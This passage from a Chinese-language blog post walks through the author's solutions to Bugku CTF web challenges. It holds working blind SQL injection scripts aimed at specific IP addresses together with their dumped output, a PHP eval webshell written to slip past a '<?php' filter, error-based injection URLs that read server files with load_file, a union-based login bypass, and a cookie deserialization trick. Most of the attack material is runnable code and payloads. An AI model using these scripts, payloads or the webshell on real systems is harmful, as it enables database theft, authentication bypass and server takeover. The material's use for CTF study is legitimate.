+                url = 'http://120.24.86.145:9004/Once_More.php?id=1%27and%20ascii(mid((select%20table_name%20from%20information_schema.tables%20where%20table_schema=%27'+schema_name+'%27%20limit%20'+str(x)+',1),'+str(y)+',1))=ascii(\''+str(i)+'\')%23'
+                s = requests.get(url)
+                if &quot;Hello&quot; in s.text:
+                    key = 1
+                    table_name = table_name + str(i)
+            if key == 0:
+                break
+        if table_name == '':
+            break
+        print 'one of tables is:' + table_name
+        for p in xrange(0,20):
+            column_name = ''
+            for q in xrange(1,20):
+                key = 0
+                for i in temp:
+                    url_columns = 'http://120.24.86.145:9004/Once_More.php?id=1%27and%20ascii(mid((select%20column_name%20from%20information_schema.columns%20where%20table_schema=%27'+schema_name+'%27%20and%20table_name=%27'+table_name+'%27limit%20'+str(p)+',1),'+str(q)+',1))=ascii(\''+str(i)+'\')%23'
+                    s = requests.get(url_columns)
+                    if &quot;Hello&quot; in s.text:
+                        key = 1
+                        column_name = column_name + str(i)
+                if key ==0:
+                    break
+            if column_name == '':
+                break
+            print 'a column name of '+table_name+' is '+column_name
+            for y in xrange(0,10):
+                data = ''
+                for z in xrange(1,20):
+                    key = 0
+                    for i in temp_data:
+                        url_data = 'http://120.24.86.145:9004/Once_More.php?id=1%27and%20ascii(mid((select%20'+column_name+'%20from%20`'+schema_name+'`.'+table_name+'%20limit%20'+str(y)+',1),'+str(z)+',1))=ascii(\''+str(i)+'\')%23'
+                        s = requests.get(url_data)
+                        if &quot;Hello&quot; in s.text:
+                            data = data + str(i)
+                            key = 1
+                    if key == 0:
+                        break
+                if data == '':
+                    break
+                print 'one data of '+schema_name+'.'+table_name+'\'s '+column_name+' is '+data
+
+
+length_schema()
+</code></pre>
+
+<p>结果</p>
+
+<pre><code>schema_length is :9
+sechma_name is :web1002-2
+one of tables is:class
+a column name of class is id
+one data of web1002-2.class's id is 1
+one data of web1002-2.class's id is 2
+one data of web1002-2.class's id is 3
+one data of web1002-2.class's id is 4
+one data of web1002-2.class's id is 5
+one data of web1002-2.class's id is 6
+one data of web1002-2.class's id is 7
+a column name of class is name
+one data of web1002-2.class's name is TOM
+one data of web1002-2.class's name is Jack
+one data of web1002-2.class's name is Mack
+one data of web1002-2.class's name is Jones
+one data of web1002-2.class's name is James
+one data of web1002-2.class's name is Fox
+one data of web1002-2.class's name is Henry
+one of tables is:flag2
+a column name of flag2 is flag2
+one data of web1002-2.flag2's flag2 is flag{Bugku-sql_6s-2
+a column name of flag2 is address
+one data of web1002-2.flag2's address is .
+[Finished in 1620.8s]
+</code></pre>
+
+<p>ps:由于遍历数据的时候设定的值为20 所以 flag只遍历出了前20位  有兴趣的话可以自行修改自己动手测试一下代码</p>
+
+<ul>
+<li>文件包含2</li>
+</ul>
+
+<p>点击去啥都没有，查看源代码，注释了一个upload.php,尝试访问</p>
+
+<p>上传一个一句话木马，或者图片马，绕过就不讲了，主要说一下过滤了&lt;?php?&gt;,一句话木马可以这样写</p>
+
+<pre><code>&lt;script language=php&gt;@eval($_POST['a']);&lt;/script&gt;
+</code></pre>
+
+<p>菜刀连接即可</p>
+
+<ul>
+<li>flag.php</li>
+</ul>
+
+<p>hint，，，，看了wp才知道传进去一个hint值即可得到源代码</p>
+
+<pre><code>&lt;?php 
+error_reporting(0); 
+include_once(&quot;flag.php&quot;); 
+$cookie = $_COOKIE['ISecer']; 
+if(isset($_GET['hint'])){ 
+    show_source(__FILE__); 
+} 
+elseif (unserialize($cookie) === &quot;$KEY&quot;) 
+{    
+    echo &quot;$flag&quot;; 
+} 
+else { 
+?&gt; 
+.......
+&lt;?php 
+} 
+$KEY='ISecer:www.isecer.com'; 
+?&gt;
+</code></pre>
+
+<p>省略了中间的html部分，就是设置一个cookie name=ISecer 然后反序列化后等于$KEY</p>
+
+<p>这里有点坑，，就是key值是在后面赋值的，也就是说，在比较的时候key为空，所以设置的cookie值为</p>
+
+<pre><code>Cookie: ISecer=s:0:&quot;&quot;;
+</code></pre>
+
+<ul>
+<li>sql注入2</li>
+</ul>
+
+<p>尝试各种注入都不行，，实在解不出来看了下wp</p>
+
+<p>说是扫目录，用bbscan扫一下得到</p>
+
+<pre><code>http://120.24.86.145:8007/web2/.DS_Store
+</code></pre>
+
+<p>使用ds_store_exp解析得到flag</p>
+
+<ul>
+<li>报错注入</li>
+</ul>
+
+<pre><code>http://103.238.227.13:10088/?id=1%0aand%0aupdatexml(1,concat(0x7e,substr(load_file(0x2f7661722f746573742f6b65795f312e706870),89,31)),1)%23
+</code></pre>
+
+<pre><code>http://103.238.227.13:10088/?id=1%0aand%0aupdatexml(1,concat(0x7e,substr(load_file(0x2f7661722f746573742f6b65795f312e706870),110,31)),1)%23
+</code></pre>
+
+<ul>
+<li>trim的日记本</li>
+</ul>
+
+<p>本来以为是二次注入，，结果扫一下域名，访问show.php就出答案了</p>
+
+<ul>
+<li>login2<br /></li>
+</ul>
+
+<p>抓包发现响应头里有一个tip</p>
+
+<pre><code>tip: JHNxbD0iU0VMRUNUIHVzZXJuYW1lLHBhc3N3b3JkIEZST00gYWRtaW4gV0hFUkUgdXNlcm5hbWU9JyIuJHVzZXJuYW1lLiInIjsKaWYgKCFlbXB0eSgkcm93KSAmJiAkcm93WydwYXNzd29yZCddPT09bWQ1KCRwYXNzd29yZCkpewp9
+</code></pre>
+
+<p>解密后</p>
+
+<pre><code>$sql=&quot;SELECT username,password FROM admin WHERE username='&quot;.$username.&quot;'&quot;;
+if (!empty($row) &amp;&amp; $row['password']===md5($password)){
+}
+</code></pre>
+
+<p>然后payload</p>
+
+<pre><code>username=a' union select 1,md5(1)#'
+password=1
+</code></pre>
+
+<p>构成的sql查询语句为</p>
+
+<pre><code>$sql=&quot;SELECT username,password FROM admin WHERE username='a' union select 1,md5(1)#'&quot;;
+</code></pre>
+
+<p>大概的原理就是前面的查询查不到就执行并返回了后面的查询，所以返回的username=1，password为md5(1)</p>
+
+<p>后面的不会了，然后还没来得及接着看平台好像出问题了，login2，3，4都无法访问了 = =</p>
+
+<ul>
+<li>login3</li>
+</ul>
+
+<p>盲注，返回分别是</p>
+
+<pre><code>username does not exist!
+和
+password error!
+</code></pre>
+
+<p>脚本</p>
+
+<pre><code>#coding=utf-8
+
+import requests
+
+url = 'http://118.89.219.210:49167/index.php'
+s =requests.Session()
+pwd = ''
+
+for i in xrange(1,33):
+    for j in xrange(48,123):
+        rule = &quot;admin'^(ascii(mid((password)from(&quot;+str(i)+&quot;)))&gt;&quot;+str(j)+&quot;)#&quot;
+        data = {'username':rule,'password':&quot;admin&quot;}
+        r = s.post(url,data=data)
+        if &quot;password error&quot; in r.content:
+            pwd += chr(j)
+            print chr(j)
+            break
+print 'password:'+pwd
+
+</code></pre>
+
+<p>就是跑这个脚本的时候，平台出问题了，，不知道又没有关系</p>
+
+<hr />
+
+<hr />
+
+<p>~~ 好了，这个web勉强也算是更完了~ ~~</p>                    
+                </div>
+                <div class="feat share">
+                </div>
+                
+                
+            </article>
+        </section>
+
+        <footer>
+	
+</footer>
+    </div>
+
+    <div class="next-prev-arrows">
+        
+            <a rel="next" href="https://blank233.github.io/2018/03/26/xss%E7%AA%83%E5%8F%96cookie/" id="next">
+                &larr; <span class="nav-title nav-title-next">Xss窃取cookie</span> 
+            </a>
+        
+        
+            <a rel="prev" href="https://blank233.github.io/2018/03/09/create_hugo_website/" id="prev">
+                 <span class="nav-title nav-title-prev">Create_Hugo_website</span> &rarr;
+            </a>
+        
+    </div>
+
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="https://blank233.github.io/js/scrollreveal.min.js"></script>
+<script type='application/javascript' src='https://blank233.github.io/js/smooth-scrollbar.js'></script>
+<script src="https://blank233.github.io/js/baffle.min.js"></script>
+<script src="https://blank233.github.io/js/main.js"></script>
+
+
+
+
+
+<!-- Syntax highlighting -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.6/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+</body>
+</html>
